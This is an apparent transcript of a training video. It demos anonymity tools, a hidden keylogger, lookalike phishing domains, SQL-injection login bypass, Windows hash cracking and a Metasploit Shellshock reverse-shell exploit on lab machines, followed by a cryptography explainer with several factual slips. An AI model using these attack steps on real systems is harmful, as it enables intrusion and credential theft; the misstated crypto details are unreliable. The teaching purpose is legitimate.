of those 14 countries and ensure that
those logs are not going to be reported
to the government and these are three
vpns basically are something that which
are good and i personally use cyberghost
i have used the others i just keep on
rotating them just to get an idea of
which one is better so
these are vpns that can allow you to
anonymize yourself on the internet
moving on uh these are the ones that we
talked about there are other safer vpn
hide my ass expressvpn and so on so
forth from our terminologies let's now
talk about vps vps is basically virtual
private server where you can rent a
service or server as a service a virtual
machine as a server so basically on a
cloud using infrastructure as a service
you can rent a server and utilize it for
whatever activity you want so let's go
to uh these sites register.com good id
network solutions or we can talk about
other cloud solutions as well so here
you can get register your domain names
uh so in the previous exercise for let's
say when we talked about the phishing
exercise uh what we want is we can go on
to register.com or we can go on to
godaddy.com and we can purchase a
particular domain for example something
like this instead of the o's i'm typing
in a couple of zeros for the facebook
and see let's see if anything of that is
available now something.photo is
available or
facetips.com is available uh there are
other options that are making over here
that they're giving us over here and
once we purchase this we can then have
our own hosting uh with the web hosting
as a service and uh you can have a linux
based hosting or a windows based hosting
depending on what you want and that's
where your shared hosting comes with the
picture if you just want uh if you want
to look at a virtual server and you want
to render server over there itself you
can move on to rackspace.com
and here in your services
you can have physical server or a
virtual server in a public cloud your
other cloud providers for example would
be amazon aws and on aws you can
basically look at ec2 elastic compute
cloud which is basically virtual servers
in the cloud and over here you can rent
out a server with whatever capacity you
require you'll obviously have to pay
rent for what those servers are going to
cost but once you have those servers you
can then launch any services on top of
it looking at other services that we
have we talked about tor tor is a onion
routing software that allows users to
browse the web anonymously so we can
just go online and we can try to spoof
our identity and i'm going to show you
how so i've got a vmware workstation
right here the one so we're just going
to pull that up and we're going to power
on a windows 7 machine where we're going
to look at the onion routing so windows
machine has booted up we're just going
to log in and this is my windows 7
machine now i've got a chrome browser
right here and we're going to go to a
website called cmyip.com which is going
to give the ip address that i'm
currently using so right now i'm not on
connected to any vpn or anything and you
can see that's my ip address that i'm
utilizing now if i want to anonymize
myself what i'm going to do is i am
going to
use star and that's the tor browser
that's set up right there if i click on
it it's going to open up the software
and it's going to create a new network
and it's going to connect to the tor
network and allow me to anonymize myself
right so that's the third browser
opening up and
giving me a new browser over here so
i've got one which is the old one which
is uh my current ip address if i just
refresh that you'll see that i'm still
on the same ip address as far as this
browser is concerned there's a refresh
and it's still showing me the same ip
address where if i go on to thor right
now and if i go to see my ip.com you
will see that it is going to give me and
you can see the amount of time it is
taking to reach that site that's because
i am using a vpn and there's a lot of
encryption running off and you can see
now i'm certainly connected via hong
kong and even to reach this site what
tor does is it gives me a proxy chain a
proxy chain is where it creates multiple
hops to hide my identity and uh before i
reach see my ip.com i am using three
different ip addresses over here one in
france one in germany and one in hong
kong so if i do something over here to
trace back my steps to my actual ip
address the law enforcement agencies or
anyone who is going to search like a
forensic investigator would have to go
through these ip addresses before they
come back to me now it's not impossible
but the effort and time that's going to
be taken to come across three different
countries is going to be phenomenal so
it may just defeat the purpose of having
so much resources spent to identify who
did what so that's what tot does for us
all right moving on from tor we are
going to look at keyloggers keyloggers
are basically softwares that run in the
background and record all the keystrokes
of the user so if i've got a keylogger
installed right now whatever i type will
be stored in a text file for the hacker
so that they can look at it later on and
just to give you an example of that we
go back to my vmware workstation and we
open up another windows 7 machine i'm
going to power this on and i'm going to
close this one till then so this virtual
machine has booted up we are going to
use user one login as user one just
close all these softwares which are not
required and once this machine is booted
up what we're going to do is i'm just
going to open up a random websites and
see what we're doing basically there's a
keylogger that's there in the startup
that's
going to record our keystrokes and we
just want to see what it actually does
now firefox is getting updated so let's
hold on now this is the latest version
of firefox right and we're just going to
go to let's say facebook.com
wait for the website to open up all
right let's try opening it up again and
that's facebook.com and we're just going
to type in some random username and
password somewhere someone at
somewhere.com and the password being
again asd rate one two three four five
six seven eight nine zero log in
obviously that login is not going to
work user probably doesn't exist or if
it does the password probably is correct
incorrect and uh so we're going to close
this we're going to let's say open up
another browser window go to another
site uh
reddiff.com and then go to red if mail
try the same thing over here someone at
somewhere.com
password is the thread one two three
four five six seven whatever it is don't
say we can see the combination is
incorrect now there's a keylogger
running in the background and what we
want is we now want to open up the
keylogger now it is visible here because
i've kept it visible you can hide it in
the start menu and there's a shortcut
key for you to pull it up later on so
this completely becomes invisible and
what it can do is it basically creates a
record of whatever you have been doing
so far so you can see these things
populating on the 25th of december so if
i look at the visited website you can
see i opened up mozilla firefox the
first where it uh there was a problem
loading the page then we opened up
facebook then we opened up
rediffmail.com and so on so forth said
this it just gives me the list of
visited websites whereas if i look at
keystrokes and clipboard you will see
whatever we have typed in so we first
typed in facebook.com then again uh the
second time i
try to type in then i hit backspace then
i type in facebook.com and then you can
see i typed in someone at somewhere.com
and then tab asd at the rate one two
three four five six seven eight nine
zero we closed up the browser we opened
up a new one and we went on to
rediffmail.com and then you can see me
typing this one then going back one
space then the rest of what i typed and
then the password coming in so that's
what a keylogger does if you look at the
taskbar it's not going to show you a
keylogger running in the background it's
in processes you're not going to see
anything at all but it's going to mask
itself as a service so if you look into
the properties you can see that icon
coming in over here which matches this
one and so you can see that this is
masking itself as a service dot exe if
this gets hidden as well it would be
very difficult for a user to even
identify this all right so that's what a
key logger is moving on let's see what
else we want to talk about so we've
talked about tor we have talked about
key loggers and now we want to talk
about firewalls now for keyloggers to be
prevented we need antiviruses right so
we need a good antivirus program that's
going to be installed updated and run on
a regular basis to protect ourselves
from malware but what about network
connections and you need a firewall and
a system to prevent or to detect what
kind of connections are going on in the
first place now we cannot rely on
software's 100 percent so even if a
firewall is not configured properly
that's that's going to be a problem so
what we need to do is we have to have a
firewall configure it correctly and then
allow and disallow certain activity from
of uh happening and what we're going to
do is i've got such a system on my
machine here i use a software called
glass wire what it does is it is a
network analyzer so it allows me to
analyze whatever is going on you can see
all the apps that i'm utilizing and how
much upload and download they have been
doing all the traffic so you can see the
protocols that i'm utilizing so i come
to know what's going on in the
background and this gives me the entire
graph of how much i have been doing for
the past 24 hours past three hours past
five minutes and so on so forth right so
this is what the activities and these
are the alerts that it has been
generating i can click on those alert
and it will start telling me what it was
all about if the graph doesn't work for
me it gives me usage as well so how much
i have utilized since i've installed
this software right and what
applications have been utilized which
host i've been connected to and the
traffic type that was utilized and then
the things on my network so these are
the devices that i have currently on my
network that has been that have been
identified and then comes the firewall
so on the firewall the firewall is
clicked on you see all those services
that have been identified and you can
just click on a particular service to
lock that service so this becomes a
discovery tool identifies whatever
networking is going on gives me all that
information and then i can look at and i
can just click on any of these services
that i find it as malicious and block
them i can create different profiles for
different applications as and when i
want them and these are the alerts so
you can see that this was the first time
a network connection was looked at from
vmware and what this allows me to do is
whenever i execute a file it can upload
it to virustotal.com and scan it as a
third-party antivirus to ensure that
there is nothing malicious on it so i
already have an antivirus over here but
if this ever gets compromised i still
can rely on a third party service where
in real time as an and when i execute my
applications uh they would be verified
and i would be assured that nothing is
wrong with my system and this software
that i'm utilizing glass wire basic is
free and then there are paid versions as
well it's just glasswire.com is where
you're going to find this moving on
rootkit rootkits are also malicious
softwares that you allow an unauthorized
user to have access to a computer to
restrict areas of its software now a
rootkit in is a census which uh a
software a malicious software that
infects a machine and prevents a from
some functionality from it like hiding
data or preventing users from running
antiviruses and it's basically a
malicious software that is used to hide
information from the victims so that
they would not realize that they have
actually been compromised it's going to
be a difficult showing of a root kit so
i cannot show that demo to you so we're
just going to move on and we're going to
talk about ethical hacking techniques
now now when we say ethical hacking
techniques we want to look at what kind
of audits are available when we want to
do ethical hacking so there's a black
box audit a white box audit and a gray
box audit so if i'm invited in an
organization to conduct a test to
conduct a audit to conduct a
vulnerability assessment or a
penetration test to identify
vulnerabilities and then try to plug
them out they are going to give me three
different variations in a black box
audit they are not going to tell me
about the infrastructure they are not
going to give me any information and
they want me to start from the basics of
gathering information identifying their
systems and based on the information
that i gather whether i'm able to
develop any hacks and compromise their
infrastructure so it will be a
simulation of a hacker who's sitting
outside the organization and trying to
find a way in whereas a white box audit
is where full infrastructure knowledge
is given anything and everything that is
required for an audit is given and this
is a simulation of an insider attack a
person sitting inside the organization
misusing their permissions and then
trying to compromise trying to get
access to data that they do not have
access to so the simulation is from a
malicious insider a gray box is where
some partial knowledge is available and
from that partial knowledge you're going
to try to build up more information and
then you're going to try to get access
to those resources what are the tools
that we utilize so we've already had a
couple of demos on keyloggers sql
injection sql map and so on so forth
metasploit is a very much used tool for
penetration testing and
having knowledge on metasploit is very
much necessary as far as ethical hacking
is concerned nmap this is a tool used
for network discovery necessary scanner
wireshark is a packet capturer that
allows you to capture packets and
analyze whatever is going on sql map is
something that we have seen a sql
injection attack tool which generates
its own queries and john the ripper is a
password cracking tool
bactrack used to be an operating system
that was utilized for penetration
testing however backtrack has now been
replaced by something called kali linux
and that's the operating system that we
have utilized in all our demos where we
tried to look at sql map and those
injection attacks that we did so what
are the areas of ethical hacking we have
just talked about all these areas as
well network services we looked at the
glasswire application that showed us how
my machine is consuming networks which
protocols are being consumed how the
connections are being
created if somebody's able to install a
trojan on my machine it is going to try
to create a new connection on the
network with the hacker to allow that
hacker a backdoor access now if i have
that glass wire or a similar firewall
implemented it is this wire wall that is
going to detect it and prevent that
connection from happening so if i
install a software that is certainly
suspicious or that install something
else in the background that i may not be
aware of that tool is going to identify
all the connections that are being made
and it is going to highlight that
connection i need to go through all of
those connections and identify whether
they are legit or not and if i find some
suspicious or doubtful i'm going to
block that connection and then i'm going
to investigate what's going on and
that's where ethical hacking comes into
the picture you want to find out if your
firewall that you have implemented is
going to work correctly or not if the
configuration of the firewall is done
properly or if the firewall is
misconfigured is it leaking out
information right at the same time
you're looking at web applications we
looked at the ovas broken web
application where we did some sql
injection attacks right so that was a
weakness or a vulnerability in that
application which would allow us to
bypass authentication and get access to
resources that we were not authorized
for and then client-side attack should
be where
you install keylogger at the end of the
at the client system and then you try to
capture whatever data the user is typing
in like usernames and passwords on the
facebook and the rediffmail.com website
that we saw and then try to misuse that
information to get access to those
resources then wi-fi networks right
wi-fi is something that we use on a
regular basis we got our smart devices
nowadays smartphones tablets phablets
that we can connect to wi-fi and start
using all our services our banking
applications and our smartphones and
thus we want to ensure that wireless
connectivity is simple and is secured so
you want to use encryption mechanisms
you want to use tools on your
smartphones antiviruses firewalls on
your smartphones to ensure that whatever
you are utilizing is going to remain
secure and then social engineering we've
looked at the phishing website on
facebook.com we've seen how easy it is
to clone websites and uh host them on
apache server so if you look at it
from ethical hackers perspective the job
of ethical hacker is to simulate these
kind of attacks that the hacker may
conduct and
first of all you're basically going to
find out areas where these attacks can
happen think of it from a hacker's
perspective try to simulate those
attacks and see if those attacks are
going to be effective can those attacks
be prevented and can your current
security controls that you have put in
place identify detect and prevent these
attacks from happening in the first
place and that is what ethical hacking
is all about let's look at the
metasploit attack metasploit is a
framework of penetration testing that
makes hacking very simple you just need
to know how to utilize the tool you need
to identify the vulnerability associated
with the particular exploit and then run
the exploit on metasploit uh we'll be
demoing this during the practical so
there are active exploits and passive
exploits inactive exploits exploits a
specific computer runs until execution
and then exits uses brute force and
exits when an error occurs in a passive
exploit these exploits wait for incoming
requests and exploit them as soon as
they connect they can also be used in
conjunction with emails and web browsers
so in passive exploits we create a
payload we like a reverse connection
payload we send it to the victim once
the victim installs that software the
machine will then initiate a connection
to us our machine will be in a listen
mode and then we will once the software
is executed at there and we would then
try to connect and exploit that
particular vulnerability this is the
practical that we'll be doing on
metasploit so let's move on with the
demos and then we'll see what we can
discuss amongst them all right let's
have a look at some of the demos that we
had talked about in the ethical hacking
and penetration testing module we are
going to look at three different demos
the first one is going to be a sql
injection attack that we are going to
perform on this tool that we have the
second one is a password cracking attack
on windows 7 and the third one is a
meter breeder based or a metasploit
based shell shock attack on a linux
based web server so let's get cracking
i've powered on this virtual machine uh
which is the ovas broken web application
it is a tool that is provided for people
who want to enhance their skills and
they can practice how to do these
attacks in a legal manner so we are
going to go to this site i'm just going
to open up my browser the ip address is
71.132
and that's the ovas broken web
application that we want to utilize
we're going to head off to mutilate a2
and we are going to look at a sql
injection attack where we want to bypass
authentication now this takes us to the
login screen so we can just try our luck
here and see that the authentication
mechanism works the account does not
exist so the username and password that
we have supplied is not the correct one
so we want to ensure that there's a
sequel database and we can try to attack
it and see
if we can bypass the authentication now
uh what we want to do is we want to
create a sql based malformed query that
can give us a different output so i'm
just going to type in a single quote
over here and type login and you can see
that this is now suddenly recognized as
a operator and there's an error that is
given out compared to the login that we
tried earlier when we used a proper text
based login mechanism it gave us the
account does not exist but here the
signal quote gave us a error and it
shows us how sql works this is the query
that we had created now in the trainings
that you have for ethical hacking there
would be explanations of what this
queries are all about how the syntax
works here we're just going to see if we
can create a malform query to log in as
a user in this case so what i'm going to
do is create the query over here we're
going to give it a comparison so we're
going to give it a r one equals one
space hyphen hyphen space and if you now
click login you should be able to bypass
authentication and you can see user has
been authenticated and we now have admin
access to this application now here the
sql queries need to be crafted in such a
perspective that they're going to work
so there would be a lot of exercise in
identifying what the database is there's
a microsoft database an oracle database
and so on so forth and then you have to
choose those proper commands but
identifying that would come in the
training right now we're just looking at
a demo this is how a sql injection
attack works now let me log out here
similarly now we are in a login page the
same query worked wonders where it
allowed us to bypass authentication so
it also depends on what kind of a page i
am and what query would be accepted at
this point in time so here application
understanding would also come into the
picture where uh which function we are
calling upon when we are connected to a
particular page now this is a user
lookup function right so again here we
try the same method test test that's not
going to work authentication error bad
user or password and if you type in the
same query over here single quote or and
give it a condition single quote or one
equals one space hyphen knife in space
now here it is not going to log us in
because this is not a login page this is
a user lookup form so here it will
instead give us a dump of all the
databases that it has so you can see all
the usernames and passwords coming in
that are stored in the user lookup field
so this is where the understanding comes
in of which query to create at what page
we are depending upon the function that
is being called right so that's the sql
uh injection attack that we wanted to
look at let's move on to password
tracking now this is a windows 7 machine
that we have i'm just going to do a very
basic password tracking example we're
just going to log in now here the
assumption is that we are able to log in
we have access to a computer and we want
to check out other users who are using
this computer and see if we can find out
their passwords so that we can log in as
a different user steal data if required
and we wouldn't be to blame if there are
any logs that are created so here we've
got a tool called k enable that is
installed right here now i'm already an
administrator on this machine and
checking out other administrators who
share the same privileges or any other
user who may be on this system whose
password i can crack and does i would be
able to get access to their account and
then do any malicious activity right so
this allows me to go into a cracker tool
and it allows me to enumerate this
machine and identify all the users and
passwords that are there in this
particular machine right so i'm just
going to click on the plus sign and i'm
going to import uh hashes from a local
system so where are these files stored
where does windows store its passwords
in what format are they stored and what
this tool does to retrieve those that's
something that we all need to know as
ethical hacker right so import the
hashes from local system click on next
it's going to enumerate that file and it
is going to give you a list of all the
users that are there so you can see the
users are hacker admin test the one that
we are logged in as and then the user
called virus as well and you can see
that this is the hash value of the
password that is being utilized now
there is a particular format for the
hash value for windows and how it stores
but once we have these hash values let's
say if i want to crack this password
there are various attacks that we can do
for example a dictionary based attack or
a brute force attack let's try a brute
force attack right ntlm is the hashing
mechanism that is used by windows so
we're going to try to create an ntlm
hash attack and here we are going to use
a predetermined rule set for example we
are not sure what characters are being
utilized over here so we just create an
attack
like this using all characters and
lowercase a through z uppercase a
through z numeric zero through nine and
all the special characters let's say the
password is between seven and sixteen
characters and this is the character set
that we want to try the brute force
attack on what is a group force attack
it is an attack where the computer is
going to try each and every permutation
and combination out of this character
set and try to figure out if the
password is going to be correct so if we
click start it's going to start with a
particular characters and then it is
going to identify if that ntlm hash is
going to work against this character and
you can see the time is going to be
phenomenal over here so it's not
necessary that this attack would be
viable it will be 100 successful given
the time frame however the time frame is
huge enough for this attack to become a
little bit redundant there are other
attacks that we can do which can easily
identify this data for us as well but
that is something that we will look on
in future videos so that's how you can
get access to users and passwords uh
there are different mechanisms where
let's say we don't have login access
then what are we going to do how we can
create a fake user login or how we can
remotely access a machine and then try
to get the same access and that is what
we are going to try to do in the next
demo on a linux machine so what we are
doing in a linux machine could also be
doable on the windows machine with a
different exploit so what i'm going to
do is this is the linux web server that
i have that i'm going to power on i'm
going to use a kali linux machine to
hack that device and i'm going to just
power off my windows 7 machine give it a
minute till it boots up now this is also
a demo machine that we have which has
its own pre-configured vulnerabilities
so here we've got something from the
pentester's lab and has a shell shock
vulnerability
implemented inside shell shock
affects linux mac and unix-based
operating systems for a particular
version of the bash shell bash is the
bone again shell which is the command
line interface in these operating
systems so what we are trying to do here
is we are going to use the kali linux
machine try to find out the
vulnerability over here and if it exists
we are going to use metasploit to attack
this machine now the first and foremost
thing is we want to identify the ip
address we have no idea what the ip
address is we are in the same subnet so
we are assuming that we are able to
connect to this machine so what i am
going to do is i am going to open up a
tool called zenmap i'm going to open up
a command line interface find out what
my ip address is and my appearance is
this with a subnet mask of two five five
two five five two five five dot zero so
i want to see if there are any other
machines that are live in the same
subnet and we are doing a ping swipe
over here to identify which machines are
live in a minute we'll get all the ip
addresses 71.1 to 133 254 and 128 we
know that we are 128 at this point in
time uh 254 is the dhcp server so we are
assuming that 133 is the machine that we
want to look at and let's then try to
see if we can scan that machine 133 and
we're going to do an intense scan to
find out which ports are open what
services are running over there and if
it is whether the pen test
machine that we were looking for you can
see of the start port 22 and port 80 and
somewhere here it's going to give us the
ports that are open and the details
about those ports and somewhere here it
will tell us that this is the pentester
lab machine that we wanted which is
correct so now we want to do a
vulnerability analysis on this what we
are going to do is i'm going to use
another gui based tool called sparta
which i can just find out from here
sparta uses two tools in the background
a nmap tool and a tool called nikto so
we're just going to start scanning 192
71.133 was the ip address add to scope
and over a period of time you can see
all of these will start populating with
information there we are that's the
nikto tool coming in scanning on port 80
which is uh which means that it's a web
server using http it tells us it's an
apache httpd 2.2.21
and that gives us the 22 port number as
well if we head over to the tab of nikto
or let's look at the screenshot first
this is what the website will be looking
like and nikto gives us the options over
here it tells us that there is a
vulnerability over here for shell shock
and this is the part where the
vulnerability is going to exist so what
we are going to do we go back to the
command line sorry we open up a new one
minimize all these other windows and we
are going to open up metasploit
metasploit is a penetration testing tool
that is used by most hackers and ethical
hackers to test applications and test
existing exploits and vulnerabilities so
just give it a minute till it starts you
can see there are already around 1700
exploits right here uh we're going to
see all those exploits with these
commands there we are sorry for the typo
and it will just give us a list of all
the exploits that are stored in
metasploit in this version so all of
these are windows based if we scroll up
we will be looking at other
vulnerabilities as well or exploits the
unique space exploits linux osx
multi-exploits and we're looking for a
exploit for um multi-based apache or
http let's go up uh let's look at so
this is the one that we are looking for
apache mod cgi bash environmental
executable so what we're going to do is
we're just going to copy it go back to
the bottom say use exploit and paste the
one that we wanted press enter
say show options so it will ask us to
configure this i'm just going to
configure it based on the knowledge that
we have set our host which is the remote
host the victims machine so we put in
the ip address it asks us for the target
uri so that's the path that we saw set
target uri to
cgi hyphen bin slash status enter now
with exploit we need to find a payload
that is going to give us the output that
we want so we say show payloads and it
will give us a list of all the
compatible payloads with this exploit
and we want to create a reverse tcp
connection which is this so we know it's
a linux operating system we want this
payload to be set so set payload press
enter that's the payload coming in show
options now that we have set the payload
this is the options for the exploit and
now we want to set our options for the
payloads as well so we are creating a
reverse tcp connection which means we
are remotely executing code at the
victim side and making the victim
connect back to our machine which means
we need to set up a listener so i need
to put my ip address over here set
localhost or lhost 192.168.71.128
which was our ip address show options
again just to ensure everything is fine
which looks like it is and we then type
in the word exploit so that it will
start this attack you can see that it
has created a mutable session at the
victim site and it has opened up a
session so if i do a pwd now pwd is a
linux command for present working
directory and it will show us that we'll
connect it to where w cgi hyphen bin do
an ls it will list all the files that's
the status file over there do a cd
backslash it will take us to the root of
this machine now remember we saw the
passwords on a windows machine similarly
we can head over to the cd etc folder ls
and you can see these files psswd and
shadow now psswd is the file where linux
stores it usernames and shadow is the
file where passwords are shown so do a
cat command psswd and you can see these
users coming up so you can see the last
user pen test lab and you can see there
are no passwords so let's do a cat
shadow and that's your hash value for
the password that we have for the user
print test lab so these are the
different attacks that we need to
understand uh and we need to create
based on the vulnerabilities that exist
on different machines so we just looked
at windows and linux and how we can
exploit them depending on existing
vulnerabilities as an ethical hacker
this is uh what we need to learn in our
trainings and then we need to clear our
exams based on this knowledge of how
these things work so that we get
certified and then we can position
ourselves for the penetration testing
jobs with the rise in censorship and
general fear over privacy loss consumer
security is at an all-time high risk
technology has made our life so much
easier while putting up a decent target
on our personal information it is
necessary to understand how to
simultaneously safeguard our data
and be up to date with the latest
technological developments maintaining
this balance has become easier with
cryptography taking its place in today's
digital world so here's a story to help
you understand cryptography
meet ann
ann wanted to look for a decent discount
on the latest iphone she started
searching on the internet and found a
rather shady website that offered a 50
discount on the first purchase
once and submitted her payment details a
huge chunk of money was withdrawn from a
bank account just moments after
devastated and quickly realized she had
failed to notice that the website was a
http web page instead of an https one
the payment information submitted was
not encrypted and it was visible to
anyone keeping an eye including the
website owner and hackers had she used a
reputed website which has encrypted
transactions and employs cryptography
our iphone enthusiast could have avoided
this particular incident this is why
it's never recommended to visit unknown
websites or share any personal
information on them
let's now understand what cryptography
is
cryptography is the science of
encrypting or decrypting information to
prevent unauthorized access we transform
our data and personal information so
that only the correct recipient can
understand the message as an essential
aspect of modern data security using
cryptography allows the secure storage
and transmission of data
between willing parties
encryption is the primary route for
employing cryptography by adding certain
algorithms to jumble up the data
decryption is the process of reversing
the work done by encrypting information
so that the data becomes readable again
both of these methods form the basis of
cryptography
for example when simply learn is jumbled
up or changed in any format not many
people can guess the original word by
looking at the encrypted text
the only ones who can are the people who
know how to decrypt the coded word
thereby reversing the process of
encryption
any data pre-encryption is called plain
text or clear text
to encrypt the message we use certain
algorithms that serve a single purpose
of scrambling the data to make them
unreadable without the necessary tools
these algorithms are called ciphers
they are a set of detailed steps to be
carried out one after the other to make
sure the data becomes as unreadable as
possible until it reaches the receiver
we take the plain text pass it to the
cipher algorithm and get the encrypted
data this encrypted text is called the
ciphertext and this is the message that
is transferred between the two parties
the key that is being used to scramble
the data is known as the encryption key
these steps that is the cipher and the
encryption key are made known to the
receiver who can then reverse the
encryption on receiving the message
unless any third party manages to find
out both the algorithm and the secret
key that is being used they cannot
decrypt the messages since both of them
are necessary to unlock the hidden
content
wonder what else we would lose if not
for cryptography
any website where you have an account
can read your passwords important emails
can be intercepted and their contents
can be read without encryption during
the transit more than 65 billion
messages are sent on whatsapp every day
all of which are secured thanks to end
to end encryption
there is a huge market opening up for
cryptocurrency which is possible due to
blockchain technology that uses
encryption algorithms and hashing
functions to ensure that the data is
secure if this is of particular interest
to you you can watch our video on
blockchain the link of which will be in
the description
of course there is no single solution to
a problem as diverse as explained there
are three variants of how cryptography
works and is in practice
they are
symmetric encryption
asymmetric encryption
and hashing
let's find out how much we have
understood until now
do you remember the difference between a
cipher and ciphertext leave your answers
in the comments and before we proceed if
you find this video interesting make
sure to give it a thumbs up before
moving ahead
let's look at symmetric encryption first
symmetric encryption uses a single key
for both the encryption and decryption
of data it is comparatively less secure
than asymmetric encryption but much
faster
it is a compromise that has to be
embraced in order to deliver data as
fast as possible without leaving
information completely vulnerable
this type of encryption is used when
data rests on servers and identifies
personnel for payment applications and
services the potential drawback with
symmetric encryption is that both the
sender and receiver need to have the
same secret key and it should be kept
hidden at all times
caesar cipher enigma machine are both
symmetric encryption examples that we
will look into further
for example
if alice wants to send a message to bob
she can apply a substitution cipher or a
shift cipher to encrypt the message
but bob must be aware of the same key
itself so he can decrypt it when he
finds it necessary to read the entire
message
symmetric encryption uses one of the two
types of ciphers stream ciphers and
block ciphers
block ciphers break the plain text into
blocks of fixed size and use the key to
convert it into ciphertext
stream ciphers convert the plaintext
into ciphertext one bit at a time
instead of resorting to breaking them up
into bigger chunks
in today's world the most widely used
symmetric encryption algorithm is aes
256 that stands for advanced encryption
standard which has a key size of 256 bit
with 128 bit and 196 bit key sizes also
being available other primitive
algorithms like the data encryption
standard that is the des the triple data
encryption standard 3des and blowfish
have all fallen out of favor due to the
rise of aes
aes chops ups the data into blocks and
performs 10 plus rounds of obscuring and
substituting the message to make it
unreadable
asymmetric encryption on the other hand
has a double whammy at its disposal
there are two different keys at play
here a public key and a private key the
public key is used to encrypt
information pre-transit and a private
key is used to decrypt the information
post transit if alice wants to
communicate with bob using asymmetric
encryption
she encrypts the message using bob's
public key
after receiving the message bob uses his
own private key to decrypt the data
this way nobody can intercept the
message in between transmissions and
there is no need for any secure key
exchange for this to work since the
encryption is done with the public key
and the decryption is done with a
private key that no one except bob has
access to both the keys are necessary to
read the full message
there is also a reverse scenario where
we can use the private key for
encryption and the public key for
decryption
a server can sign non-confidential
information using its private key and
anyone who has its public key can
decrypt the message
this mechanism also proves that the
sender is authenticated and there is no
problem with the origin of the
information
rsa encryption is the most widely used
asymmetric encryption standard it is
named after its founders reversed shamir
and edelman and it uses block ciphers
that separate the data into blocks and
obscure the information
widely considered the most secure form
of encryption albeit relatively slower
than aes it is widely used in web
browsing secure identification vpns
emails and chat applications
with so much hanging on the key secrecy
there must be a way to transmit the keys
without others reading our private data
many systems use a combination of
symmetric encryption and asymmetric
encryption to bolster security and match
speed at the same time
since asymmetric encryption takes longer
to decrypt large amounts of data the
full information is encrypted using a
single key that is symmetric encryption
that single key is then transmitted to
the receiver using asymmetric encryption
so you don't have to compromise either
way another route is using the
diffie-hellman key exchange which relies
on a one-way function and is much
tougher to break into
the third variant of cryptography is
termed as hashing
hashing is the process of scrambling a
piece of data beyond recognition it
gives an output of fixed size which is
known as the hash value of the original
data or just hash in general
the calculations that do the job of
messing up the data collection form the
hash function
they are generally not reversible
without resilient brute force mechanisms
and are very helpful when storing data
on website servers that need not be
stored in plain text
for example many websites store your
account passwords in a hashed format so
that not even the administrator can read
your credentials when a user tries to
log in they can compare the entered
passwords hash value with the hash value
that is already stored on the servers
for authentication since the function
will always return the same value for
the same
input cryptography has been in practice
for centuries
julius caesar used a substitution shift
to move alphabets a certain number of
spaces beyond their place in the
alphabet table
a spy can't decipher the original
message at first glance for example if
he wanted to pass confidential
information to his armies and decides to
use the substitution shift of plus 2
a becomes c b becomes d and so on
the word attack when passed through a
substitution shift of plus 3 becomes dw
defn
this cipher has been appropriately named
the caesar cipher which is one of the
most widely used algorithms
the enigma is probably the most famous
cryptographic cipher device used in
ancient history
it was used by the nazi german armies in
the world wars they were used to protect
confidential political
military and administrative information
and it consisted of three or more rotors
that scrambled the original message
depending on the machine state at that
time the decryption is similar but it
needs both machines to stay in the same
state before passing the cipher text so
that we received the same plain text
message
let's take a look at how our data is
protected while we browse the internet
thanks to cryptography here we have a
web-based tool that will help us
understand the process of rsa encryption
we see the entire workflow from
selecting the key size to be used until
the decryption of the cipher text in
order to get the plain text back
as we already know rsa encryption
algorithm falls under the umbrella of
asymmetric key cryptography
that basically implies that we have two
keys at play here a public key and a
private key
typically the public key is used by the
sender to encrypt the message and the
private key is used by the receiver to
decrypt the message
there are some occasions when this
allocation is reversed and we will have
a look at them as well
in rsa we have the choice of key size we
can select any key from a 512 bit to
1024 bit all the way up to a 4096 bit
key the longer the key length the more
complex the encryption process becomes
and thereby strengthening the cipher
text
although with added security more
complex functions take longer to perform
the same operations on similar size of
data we have to keep a balance between
both speed and strength because the
strongest encryption algorithms are of
no use if they cannot be practically
deployed in systems around the world
let's take a 1024 bit key over here
now we need to generate the keys
this generation is done by functions
that operate on pass phrases the tool we
are using right now generates this
pseudo random keys to be used in this
explanation once we generate the keys
you can see the public key is rather
smaller than the private key which is
almost always the case
these two keys are mathematically linked
with each other
they cannot be substituted with any
other key and in order to encrypt the
original message or decrypt the cipher
text this pair must be kept together the
public key is then sent to the sender
and the receiver keeps the private key
with himself
in this scenario let's try and encrypt a
word simply learn
we have to select if the key being used
for encryption is either private or
public since that affects the process of
scrambling the information since we are
using the public key over here
let's select the same
and copy it and paste over here
the cipher we are using right now is
plain rsa there are some modified
ciphers with their own pros and cons
that can also be used provided we use it
on a regular basis and depending on the
use case as well
once we click on encrypt we can see the
ciphertext being generated over here
the pseudorandom generating functions
are created in such a way that a single
character change in the plaintext will
trigger a completely different
ciphertext this is a security feature to
strengthen the process from brute force
methods
now that we are done with the encryption
process let's take a look at the
decryption part
the receiver gets this cipher text from
the sender with no other key or
supplement
he or she must already possess the
private key generated from the same pair
no other private key can be used to
decrypt the message since they are
mathematically linked
we paste the private key here and select
the same
the cipher must always so be the same
used during the encryption process
once we click decrypt you can see the
original plain text we had decided to
encrypt this sums up the entire process
of rsa encryption and decryption
now some people use it the other way
around we also have the option of using
the private key to encrypt information
and the public key to decrypt it this is
done mostly to validate the origin of
the message since the keys only work in
pairs if a different private key is used
to encrypt the message the public key
cannot decrypt it conversely if the
public key is able to decrypt the
message it must have been encrypted with
the right private key and hence the
rightful owner
here we just have to take the private
key
and use that to encrypt the plain text
and select the same in this checkbox as
well
you can see we have generated a
completely new cipher text
this cipher text will be sent to the
receiver and this time we will use the
public key for decryption
let's select the correct checkbox and
decrypt
and we still get the same output
now let's take a look at practical
example of encryption in the real world
we all use the internet on a daily basis
and many are aware of the implications
of using unsafe websites let's take a
look at wikipedia here pretty standard
https website where the h stands for
secured let's take a look at how it
secures the data
wireshark is the world's foremost and
most widely used network protocol
analyzer it lets you see what's
happening on your network at a
microscopic level
and we are going to use the software to
see the traffic that is leaving our
machine and to understand how vulnerable
it is
since there are many applications
running in this machine let's apply a
filter that will only show us the
results related to wikipedia
let's search for something that we can
navigate the website with
okay once we get into it a little you
can see some of the requests being
populated over here
let's take a look at the specific
request
these are the data packets that
basically transport the data from our
machine to the internet and vice versa
as you can see there's a bunch of
gibberish data here that doesn't really
reveal anything that we searched or
watched similarly other secured websites
function the same way and it is very
difficult if at all possible to snoop on
user data this way
to put this in perspective
let's take a look at another website
which is a http web page
this has no encryption enabled from the
server end which makes it vulnerable to
attacks
there is a login form here which needs
legitimate user credentials in order to
grant access
let's enter a random pair of credentials
these obviously won't work but we can
see the manner of data's transfer
unsurprisingly we weren't able to get
into the platform
instead we can see the data packets
let's apply a similar filter that will
help us understand
what request this website is sending
these are the requests being sent by the
http login form to the internet if we
check here
see whatever username and password that
we are entering we can easily see it
with the wireshark
now we used a dummy pair of credentials
if we select the right data packet we
